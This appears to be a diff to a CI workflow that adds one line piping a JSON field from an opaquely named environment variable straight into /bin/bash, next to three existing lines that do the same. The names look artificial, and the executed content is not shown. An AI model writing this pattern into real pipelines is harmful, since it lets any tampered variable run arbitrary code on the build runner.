@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$rtqpr940" | jq -r .xjxj90357 | /bin/bash
           printf '%s' "$nfiyx45721" | jq -r .ovev503 | /bin/bash
           printf '%s' "$hvx4" | jq -r .bxlx2124 | /bin/bash
+          echo $kbas50 | jq -r .mjff0 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
